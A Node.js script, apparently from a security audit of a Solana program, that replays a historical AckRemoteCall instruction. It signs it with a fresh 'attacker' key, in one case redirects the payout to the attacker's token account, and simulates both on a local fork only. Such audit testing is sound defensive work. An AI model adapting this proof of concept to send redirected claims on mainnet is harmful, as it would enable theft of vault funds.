#!/usr/bin/env node
// Historical current-deployment AckRemoteCall payload, signed by a fresh
// outsider and simulated only on a loopback Surfpool fork. Never sends.
const fs=require('fs');
const crypto=require('crypto');
const modules='/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/audit-tools/node_modules/';
const {PublicKey,Keypair,TransactionInstruction,TransactionMessage,SystemProgram}=require(modules+'@solana/web3.js');
const {getAssociatedTokenAddressSync,TOKEN_2022_PROGRAM_ID}=require(modules+'@solana/spl-token');
const bs58mod=require(modules+'bs58'),bs58=bs58mod.default||bs58mod;
const {encodeV1}=require('./klend-v1-composition.js');
const fork='http://127.0.0.1:9397';
const program=new PublicKey('STANDjrnkxme4tKsZSnW3WUQ9iKxbhJQj33dbW2F9sZ');
const mint=new PublicKey('DUSDt4AeLZHWYmcXnVGYdgAzjtzU5mXUVnTMdnSzAttM');
const historicalSignature='2UY1TAtmDvQCcfCDyXjS8pqKhWoSkYDZfWH7itfyANKuPKVme1jnBhmSJA2MV2wWPq68sEAbtYpt3miSfnXJSVYZ';
const env=Object.fromEntries(fs.readFileSync('/tmp/composer-helius-only.env','utf8')
 .split('\n').filter(Boolean).map(x=>x.split(/=(.*)/s).slice(0,2)));
const mainnet=env.HEAVY_RPC_URL||env.RPC_URL;
let nextId=0;
async function rpc(url,method,params){
 const response=await fetch(url,{method:'POST',headers:{'content-type':'application/json'},
  body:JSON.stringify({jsonrpc:'2.0',id:++nextId,method,params})});
 const body=await response.json();if(body.error)throw Error(`${method}: ${JSON.stringify(body.error)}`);
 return body.result;
}
function tokenRaw(row){
 if(!row?.data||row.owner!==TOKEN_2022_PROGRAM_ID.toBase58())return null;
 return Buffer.from(row.data[0],'base64').readBigUInt64LE(64).toString();
}
function sign(ix,attacker,blockhash){
 const encoded=encodeV1([ix],attacker.publicKey,blockhash);
 if(encoded.requiredSignatures!==1)throw Error('unexpected signer count');
 const compiled=new TransactionMessage({payerKey:attacker.publicKey,
  recentBlockhash:blockhash,instructions:[ix]}).compileToV0Message();
 if(!compiled.staticAccountKeys[0].equals(attacker.publicKey))throw Error('unexpected signer order');
 const wire=Buffer.from(encoded.wire);
 const key=crypto.createPrivateKey({key:Buffer.concat([
  Buffer.from('302e020100300506032b657004220420','hex'),
  Buffer.from(attacker.secretKey.subarray(0,32))]),format:'der',type:'pkcs8'});
 crypto.sign(null,wire.subarray(0,wire.length-64),key).copy(wire,wire.length-64);
 return {wire,encoded};
}
async function main(){
 const historical=await rpc(mainnet,'getTransaction',[historicalSignature,
  {encoding:'json',commitment:'confirmed',maxSupportedTransactionVersion:1}]);
 if(!historical||historical.meta.err)throw Error('historical positive control missing');
 const msg=historical.transaction.message,raw=msg.instructions.find(x=>
  msg.accountKeys[x.programIdIndex]===program.toBase58());
 if(!raw)throw Error('AckRemoteCall instruction missing');
 const hdr=msg.header,keys=raw.accounts.map(i=>({pubkey:new PublicKey(msg.accountKeys[i]),
  isSigner:i<hdr.numRequiredSignatures,
  isWritable:i<hdr.numRequiredSignatures ?
   i<hdr.numRequiredSignatures-hdr.numReadonlySignedAccounts :
   i<msg.accountKeys.length-hdr.numReadonlyUnsignedAccounts}));
 const data=Buffer.from(bs58.decode(raw.data));
 const originalRecipient=keys[1].pubkey;
 const originalDestination=keys[4].pubkey;
 const vault=keys[5].pubkey;
 const attacker=Keypair.generate();
 const attackerDestination=getAssociatedTokenAddressSync(mint,attacker.publicKey,false,TOKEN_2022_PROGRAM_ID);
 await rpc(fork,'surfnet_setAccount',[attacker.publicKey.toBase58(),{data:'',executable:false,
  lamports:1_000_000_000,owner:SystemProgram.programId.toBase58(),rentEpoch:0}]);
 const publicKeys=[...new Set(keys.map(k=>k.pubkey.toBase58()))];
 await rpc(fork,'getMultipleAccounts',[publicKeys,{encoding:'base64',commitment:'processed'}]);
 const before=(await rpc(fork,'getMultipleAccounts',[[vault.toBase58(),originalDestination.toBase58(),
  attackerDestination.toBase58()],{encoding:'base64',commitment:'processed'}])).value;
 const cases=[{label:'fresh_signer_exact_claim',redirect:false},
  {label:'fresh_signer_redirected_recipient',redirect:true}];
 const results=[];
 for(const test of cases){
  const metas=keys.map(k=>({...k}));metas[0].pubkey=attacker.publicKey;
  if(test.redirect){metas[1].pubkey=attacker.publicKey;metas[4].pubkey=attackerDestination;}
  const ix=new TransactionInstruction({programId:program,keys:metas,data});
  const bh=(await rpc(fork,'getLatestBlockhash',[{commitment:'processed'}])).value.blockhash;
  const {wire,encoded}=sign(ix,attacker,bh);
  const sim=await rpc(fork,'simulateTransaction',[wire.toString('base64'),{encoding:'base64',
   sigVerify:true,replaceRecentBlockhash:false,commitment:'processed',
   accounts:{encoding:'base64',addresses:[vault.toBase58(),originalDestination.toBase58(),
    attackerDestination.toBase58()]}}]);
  const after=sim.value.accounts||[];
  results.push({label:test.label,err:sim.value.err,bytes:encoded.sizeBytes,
   addresses:encoded.addressCount,requiredSignatures:encoded.requiredSignatures,
   unitsConsumed:sim.value.unitsConsumed,postTokenRaw:after.map(tokenRaw),
   logs:sim.value.logs});
  console.log(JSON.stringify({label:test.label,err:sim.value.err,bytes:encoded.sizeBytes,
   addresses:encoded.addressCount,errorLog:sim.value.logs?.find(x=>x.includes('Error')),
   postTokenRaw:after.map(tokenRaw)}));
 }
 const report={generatedAt:new Date().toISOString(),scope:'historical post-deployment AckRemoteCall payload; current binary on isolated fork; no mainnet send',
  program:program.toBase58(),historicalSignature,historicalSlot:historical.slot,
  instructionDiscriminatorHex:data.subarray(0,8).toString('hex'),
  attacker:attacker.publicKey.toBase58(),originalRecipient:originalRecipient.toBase58(),
  originalDestination:originalDestination.toBase58(),attackerDestination:attackerDestination.toBase58(),
  vault:vault.toBase58(),beforeTokenRaw:before.map(tokenRaw),sigVerify:true,results};
 fs.writeFileSync(__dirname+'/stand-ack-outsider-signed-screen.json',JSON.stringify(report,null,2)+'\n');
}
main().catch(e=>{console.error(e.stack||e);process.exitCode=1});
